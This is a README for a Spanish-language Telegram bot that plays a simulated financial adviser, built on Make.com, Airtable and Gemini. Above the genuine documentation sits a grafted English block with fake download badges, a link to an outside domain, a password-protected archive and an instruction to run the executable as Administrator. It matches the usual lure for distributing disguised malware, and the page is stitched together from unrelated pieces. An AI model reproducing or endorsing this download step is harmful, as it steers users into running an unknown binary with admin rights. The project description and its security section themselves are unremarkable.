<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Generative Agent

Presentamos un bot de Telegram con el que se conversa con Borja, un asesor financiero ficticio del Madrid de los 90, como si fuera una persona: recuerda lo que le cuentas, forma su propia opinión sobre ti y sobre sí mismo con el tiempo, tiene un plan para cada día y sigue la actualidad financiera aunque nadie le escriba. Si le cuentas qué inversiones tienes («he comprado 50 acciones de Inditex a 45 euros»), las apunta en tu cartera; si le preguntas cómo van («¿cuánto vale hoy mi cartera?»), consulta las cotizaciones y te da el valor y el resultado calculados al céntimo; si le planteas una cuenta («si ahorro 300 euros al mes durante 20 años al 5 %, ¿cuánto tendría?»), la resuelve con código en lugar de estimarla. Cada día prepara su agenda de eventos financieros, estudia cada uno cuando se publica, lee la prensa económica y relaciona lo que pasa con tu cartera; cuando le falta un dato para valorar algo, te escribe él para preguntártelo. Para usarlo basta con abrir el bot en Telegram y escribirle con naturalidad: no hay comandos, y todo lo que dice y aprende se guarda por conversación, de modo que cada usuario tiene su propia relación con él.

## Qué hace

- **Recuerda.** Cada mensaje se guarda como una memoria con su importancia y su embedding. Antes de responder, el agente recupera lo más relevante combinando recencia, importancia y similitud, como en el paper.
- **Reflexiona.** Cuando la importancia acumulada supera un umbral, extrae conclusiones de alto nivel y las vuelve a guardar como memorias, con las que las justifican.
- **Planifica.** Cada día a las 5:00 genera su plan. Para el asesor financiero, el plan es la agenda de eventos financieros del día con hora confirmada.
- **Percibe y reacciona.** Cada hora estudia el punto del plan que tocaba, lo cruza con la cartera de cada usuario y, si le falta un dato, pregunta por iniciativa propia.
- **Lee la prensa.** Cuatro veces al día revisa los titulares de la prensa económica y guarda los que afectan a la cartera de cada usuario, con su implicación.
- **Lleva tu cartera.** Registra las posiciones que le cuentas en la conversación, con cantidad y precio medio.
- **Consulta cotizaciones y calcula.** Pide precios a Yahoo Finance cuando hacen falta, valora la cartera y resuelve cuentas financieras con código ejecutado en Make, sin dejar la aritmética al modelo.
- **Estudia.** Ante una pregunta profesional que no sabe responder, investiga en la web y guarda lo aprendido.

## Escenarios

| Archivo | Escenario | Disparo |
| --- | --- | --- |
| `blueprints/01_gateway_telegram.blueprint.json` | (1) Gateway de Telegram | Mensaje en Telegram |
| `blueprints/02_memoria_escribir.blueprint.json` | (2) Memoria: Escribir | Webhook |
| `blueprints/03_memoria_reflexionar.blueprint.json` | (3) Memoria: Reflexionar | Webhook |
| `blueprints/04_memoria_recuperar.blueprint.json` | (4) Memoria: Recuperar | Webhook |
| `blueprints/05_planificar.blueprint.json` | (5) Planificar | Webhook |
| `blueprints/06_responder.blueprint.json` | (6) Responder | Webhook |
| `blueprints/07_resumen_agente.blueprint.json` | (7) Resumen del agente | Webhook |
| `blueprints/08_estudiar.blueprint.json` | (8) Estudiar | Webhook |
| `blueprints/09_interpelar.blueprint.json` | (9) Interpelar | Webhook |
| `blueprints/10_despertador.blueprint.json` | (10) Despertador | Diario, 5:00 |
| `blueprints/11_percibir_reaccionar.blueprint.json` | (11) Percibir y reaccionar | Cada hora, laborables de 9:00 a 23:00 |
| (sin blueprint en esta versión) | (12) Noticias | Laborables a las 8:00, 12:00, 16:00 y 20:00 |
| (sin blueprint en esta versión) | (13) Cotizar | Webhook |

Los blueprints de esta versión corresponden a una revisión anterior de los escenarios: no incluyen Noticias ni Cotizar, y los de Planificar, Responder y Percibir no reflejan aún los cambios descritos en la documentación (plan único para el agente financiero, cartera estructurada, cotizaciones y calculadora). La documentación describe el sistema actual con el detalle suficiente para reconstruirlos.

Cada blueprint lleva notas de Make en sus webhooks y en cada llamada a webhook con el origen y el destino.

## Requisitos

- Una cuenta de Make.com con un plan de pago, porque la calculadora usa el módulo Make Code. Con un usuario activo, el sistema consume unos 6.400–7.400 créditos al mes antes de conversar; la sección 19 de la documentación desglosa el coste.
- Una base de Airtable.
- Una clave de la API de Gemini.
- Un bot de Telegram.
- Opcional: Slack, si quieres un registro de las conversaciones en un canal.

Las cotizaciones y la prensa no necesitan clave: salen de Yahoo Finance y de un feed RSS de Google News.

## Instalación

1. Crea en Airtable la tabla Memory Stream con los campos de la sección 3 de la documentación.
2. Crea en Make dos almacenes de datos: la caché (agente, chat_id, resumen, actualizado) y Cartera (agente, chat_id, cartera, posiciones, actualizado). Guarda en la caché el registro `perfil|<agente>` con la descripción del personaje.
3. Importa los blueprints y crea el webhook de cada escenario que lo tenga. Crea todos los webhooks antes de rellenar ninguna llamada, porque hay dependencias circulares: Escribir llama a Reflexionar y Reflexionar a Escribir. Monta Noticias y Cotizar, y actualiza Planificar, Responder y Percibir, siguiendo sus secciones de la documentación.
4. Sustituye los marcadores de la tabla siguiente. Las notas de cada webhook dicen qué módulos lo llaman.
5. Elige en cada módulo las conexiones y los almacenes de datos, que llegan vacíos.
6. Fija la programación: inmediata en los escenarios con webhook, diaria a las 5:00 en el Despertador, cada hora de 9:00 a 23:00 en laborables en Percibir y a las 8:00, 12:00, 16:00 y 20:00 en laborables en Noticias.

| Marcador | Qué poner |
| --- | --- |
| `<WEBHOOK_ESCRIBIR>`, `<WEBHOOK_RESPONDER>`… | El identificador del webhook de cada escenario |
| `<AIRTABLE_BASE_ID>`, `<AIRTABLE_TABLE_ID>` | La base y la tabla Memory Stream |
| `<FLD_MEMORIA>`, `<FLD_TIPO>`… | El ID de cada campo de la tabla; el nombre indica cuál |
| `<SLACK_CHANNEL_ID>` | El canal de Slack, si lo usas |

## Seguridad

Por defecto, Make no protege las URLs de los webhooks: quien tenga una puede invocar el escenario, leer o escribir la memoria del agente y gastar tus créditos. No publiques tus URLs ni las incluyas en una copia de este repositorio. Make permite exigir una clave en cada webhook; si abres el bot a terceros, actívala.

La tabla de Airtable guarda literalmente lo que cada usuario dice al bot, y el almacén Cartera, las inversiones que le cuenta. Si lo abres a terceros, avísales.

La ruta de cálculo ejecuta en el entorno aislado de Make el código que escribe el modelo, tras un filtro que rechaza cualquier acceso externo. Si el bot va a hablar con desconocidos, revisa la sección 20 de la documentación.


---

MIT License

Copyright (c) 2026 Agus Cortés

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
